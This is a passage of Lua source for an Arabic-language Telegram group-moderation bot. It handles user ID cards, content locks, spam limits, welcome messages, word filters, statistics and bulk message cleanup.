notpicid = DevAbd:get(TRON.."Abd:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "⌁︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevAbd:get(TRON..'Abd:Lock:Id'..msg.chat_id_) then
if not DevAbd:get(TRON..'Abd:Lock:Id:Photo'..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, TRONTEAM)
end
end 
--     Source TRON     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "التعديل" then
if not DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التعديل")  
DevAbd:set(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
if not DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل تعديل الميديا")  
DevAbd:set(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not DevAbd:get(TRON..'Abd:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفارسيه")  
DevAbd:set(TRON..'Abd:Lock:Farsi'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if DevAbd:get(TRON..'Abd:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفشار")  
DevAbd:del(TRON..'Abd:Lock:Fshar'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الطائفيه" then
if DevAbd:get(TRON..'Abd:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الطائفيه")  
DevAbd:del(TRON..'Abd:Lock:Taf'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if DevAbd:get(TRON..'Abd:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الكفر")  
DevAbd:del(TRON..'Abd:Lock:Kfr'..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not DevAbd:get(TRON..'Abd:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفارسيه بالطرد")  
DevAbd:set(TRON..'Abd:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالحذف")  
DevAbd:set(TRON.."Abd:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالطرد")  
DevAbd:set(TRON.."Abd:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالتقيد")  
DevAbd:set(TRON.."Abd:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالطرد")  
end
if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevAbd:get(TRON..'Abd:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevAbd:set(TRON.."Abd:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التثبيت")  
DevAbd:set(TRON..'Abd:Lock:Pin'..msg.chat_id_,true)
DevAbd:sadd(TRON.."Abd:Lock:Pinpin",msg.chat_id_) 
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     Source TRON     --
if Admin(msg) then
if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevAbd:hset(TRON.."Abd:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
end
--     Source TRON     --
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Id:Photo'..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الايدي بالصوره'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevAbd:get(TRON..'Abd:Lock:Id:Photo'..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الايدي بالصوره'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not DevAbd:get(TRON..'Abd:Lock:Id'..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد مفعل ', 1, 'md')
else
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الايدي بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevAbd:get(TRON..'Abd:Lock:Id'..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد معطل ', 1, 'md')
else
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الايدي بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source TRON     --
if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevAbd:setex(TRON.."Abd:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' or text == 'انشاء الرابط' then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevAbd:get(TRON.."Abd:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevAbd:set(TRON.."Abd:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevAbd:setex(TRON.."Abd:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
end
end
--     Source TRON     --
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الترحيب بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON.."Abd:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الترحيب بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON.."Abd:Lock:Welcome"..msg.chat_id_)
end
if DevAbd:get(TRON..'Abd:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevAbd:del(TRON..'Abd:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbd:del(TRON..'Abd:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevAbd:set(TRON..'Abd:Groups:Welcomes'..msg.chat_id_,Welcomes)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الترحيب الان\n⌁︙تستطيع اضافة مايلي ↫ ⤈\n⌁︙دالة عرض الاسم ↫ firstname\n⌁︙دالة عرض المعرف ↫ username', 1, 'md')
DevAbd:set(TRON..'Abd:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الترحيب")  
DevAbd:del(TRON..'Abd:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevAbd:get(TRON..'Abd:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Abd(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم وضع الترحيب \n⌁︙ارسل ↫ ضع ترحيب للحفظ ', 1, 'md')
end
end
--     Source TRON     --
if DevAbd:get(TRON..'Abd:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء حفظ الوصف", 1, 'md')
DevAbd:del(TRON..'Abd:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbd:del(TRON..'Abd:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevAbd:set(TRON..'Abd:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الوصف الان', 1, 'md')
end
--     Source TRON     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
DevAbd:set(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevAbd:get(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر المنع', 1, 'md')
DevAbd:del(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم منع الكلمه ↫ "..text, 1, 'html')
DevAbd:del(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevAbd:hset(TRON..'Abd:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
DevAbd:set(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevAbd:get(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الغاء المنع', 1, 'md')
DevAbd:del(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevAbd:hget(TRON..'Abd:Filters:'..msg.chat_id_, text) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevAbd:del(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevAbd:hdel(TRON..'Abd:Filters:'..msg.chat_id_, text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
DevAbd:del(TRON.."Abd:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source TRON     --
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫ الاحصائيات ⌁" then
local gps = DevAbd:scard(TRON.."Abd:Groups") local users = DevAbd:scard(TRON.."Abd:Users") 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙احصائيات البوت ↫ ⤈\n⌁︙عدد المشتركين ↫ ❨ '..users..' ❩\n⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين ⌁" then
local users = DevAbd:scard(TRON.."Abd:Users")
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ⌁" then
local gps = DevAbd:scard(TRON.."Abd:Groups")
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
end
--     Source TRON     --
if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
if not DevAbd:get(TRON..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevAbd:setex(TRON..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) then 
local pv = DevAbd:smembers(TRON.."Abd:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevAbd:srem(TRON.."Abd:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين الان ↫ { '..#pv..' }\n⌁︙تم حذف ↫ { '..sendok..' } من المشتركين\n⌁︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source TRON     --
if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) then 
local group = DevAbd:smembers(TRON.."Abd:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevAbd:srem(TRON.."Abd:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = TRON, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAbd:srem(TRON.."Abd:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAbd:srem(TRON.."Abd:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevAbd:srem(TRON.."Abd:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local TRONgp2 = (w + q)
local TRONgp3 = #group - TRONgp2
if q == 0 then
TRONgp2 = ''
else
TRONgp2 = '\n⌁︙تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
TRONgp1 = ''
else
TRONgp1 = '\n⌁︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙عدد الكروبات الان ↫ { '..#group..' }'..TRONgp1..TRONgp2..'\n⌁︙العدد الحقيقي الان  ↫ ( '..TRONgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     Source TRON     --
if text and (text == "تفعيل امسح" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل امسح مع ميزة الحذف التلقائي للميديا'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:Clean'..msg.chat_id_,true)  
end
if text and (text == "تعطيل امسح" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل امسح مع ميزة الحذف التلقائي للميديا'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:Clean'..msg.chat_id_) 
end
if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$")) and Constructor(msg) then   
local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$")
if tonumber(Num) < 50 or tonumber(Num) > 200 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد اكبر من 50 واصغر من 200 للحذف التلقائي', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
DevAbd:set(TRON..'Abd:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevAbd:get(TRON..'Abd:Lock:Clean'..msg.chat_id_) then
if DevAbd:get(TRON..'Abd:CleanNum'..msg.chat_id_) then CleanNum = DevAbd:get(TRON..'Abd:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevAbd:scard(TRON.."Abd:cleaner"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevAbd:smembers(TRON.."Abd:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"⌁︙تم حذف "..Del.." من الميديا تلقائيا",0,'md') 
DevAbd:del(TRON.."Abd:cleaner"..msg.chat_id_)
end 
end 
if Cleaner(msg) then
if DevAbd:get(TRON..'Abd:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevAbd:scard(TRON.."Abd:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙عدد الميديا ↫ "..M.."\n⌁︙الحذف التلقائي ↫ "..(DevAbd:get(TRON..'Abd:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
local List = DevAbd:smembers(TRON.."Abd:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف "..Del.." من الميديا", 1, 'md') 
DevAbd:del(TRON.."Abd:cleaner"..msg.chat_id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
--     Source TRON     --
if Admin(msg) then
if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
Abd_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Abd_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Abd_Del},function(arg,data)
new = 0
Abd_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Abd_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Abd_Del2)
end,nil)  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     Source TRON     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^فتح (.*)$") then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "التعديل" then
if DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التعديل")  
